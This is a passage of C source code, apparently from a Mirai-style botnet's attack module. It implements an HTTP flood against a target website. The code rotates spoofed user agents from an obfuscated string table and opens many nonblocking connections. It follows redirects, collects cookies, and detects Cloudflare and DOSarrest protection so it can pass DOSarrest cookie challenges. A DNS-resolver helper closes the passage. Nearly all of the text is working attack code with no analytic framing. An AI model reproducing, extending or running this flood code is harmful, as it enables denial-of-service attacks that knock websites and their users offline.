                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
            case 5:
                table_unlock_val(TABLE_HTTP_SIX);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SIX, NULL));
                table_lock_val(TABLE_HTTP_SIX);
                break;
            case 6:
                table_unlock_val(TABLE_HTTP_SEVEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SEVEN, NULL));
                table_lock_val(TABLE_HTTP_SEVEN);
                break;
            case 7:
                table_unlock_val(TABLE_HTTP_EIGHT);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_EIGHT, NULL));
                table_lock_val(TABLE_HTTP_EIGHT);
                break;
            case 8:
                table_unlock_val(TABLE_HTTP_NINE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_NINE, NULL));
                table_lock_val(TABLE_HTTP_NINE);
                break;
            case 9:
                table_unlock_val(TABLE_HTTP_TEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TEN, NULL));
                table_lock_val(TABLE_HTTP_TEN);
                break;
            case 10:
                table_unlock_val(TABLE_HTTP_ELEVEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ELEVEN, NULL));
                table_lock_val(TABLE_HTTP_ELEVEN);
                break;
            case 11:
                table_unlock_val(TABLE_HTTP_TWELVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWELVE, NULL));
                table_lock_val(TABLE_HTTP_TWELVE);
                break;
            case 12:
                table_unlock_val(TABLE_HTTP_THIRTEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTEEN, NULL));
                table_lock_val(TABLE_HTTP_THIRTEEN);
                break;
            case 13:
                table_unlock_val(TABLE_HTTP_FOURTEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOURTEEN, NULL));
                table_lock_val(TABLE_HTTP_FOURTEEN);
                break;
            case 14:
                table_unlock_val(TABLE_HTTP_FIVETEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVETEEN, NULL));
                table_lock_val(TABLE_HTTP_FIVETEEN);
                break;
            case 15:
                table_unlock_val(TABLE_HTTP_SIXTEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SIXTEEN, NULL));
                table_lock_val(TABLE_HTTP_SIXTEEN);
                break;
            case 16:
                table_unlock_val(TABLE_HTTP_SEVENTEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SEVENTEEN, NULL));
                table_lock_val(TABLE_HTTP_SEVENTEEN);
                break;
            case 17:
                table_unlock_val(TABLE_HTTP_EIGHTEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_EIGHTEEN, NULL));
                table_lock_val(TABLE_HTTP_EIGHTEEN);
                break;      
            case 18:
                table_unlock_val(TABLE_HTTP_NINETEEN);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_NINETEEN, NULL));
                table_lock_val(TABLE_HTTP_NINETEEN);
                break;   
            case 19:
                table_unlock_val(TABLE_HTTP_TWENTY);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY, NULL));
                table_lock_val(TABLE_HTTP_TWENTY);
                break;                                                                                                                                                                                                                                             
        }

        util_strcpy(http_table[i].path, path);
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_http_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

                char buf[10240];
                util_zero(buf, 10240);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), " ");
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                if (conn->num_cookies > 0)
                {
                    util_strcpy(buf + util_strlen(buf), "Cookie: ");
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), "; ");
                    }
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }

                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;

                    if (sockets == 1)
                        printf("[http flood] headers: \"%s\"\n", generic_memes);

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            nl_off++;

                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
                            {
                                ii = 7;
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;
                                        break;
                                    }
                                    ii++;
                                }

                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=") != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=");

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                {
                                    ii = 7;
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, "GET");
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);

                    if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    while (TRUE)
                    {
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
                            errno = ECONNRESET;
                            ret = -1;
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (conn->content_length == 0)
                            {
                                if (conn->chunked == 1)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;

                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (consumed == 0)
                                break;
                            else
                            {
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    while(TRUE)
                    {
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
                            errno = ECONNRESET;
                            ret = -1;
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}


static ipv4_t get_dns_resolver(void)
{
    int fd;
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found)
            {
                return inet_addr(ipbuf);
            }
        }
    }
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
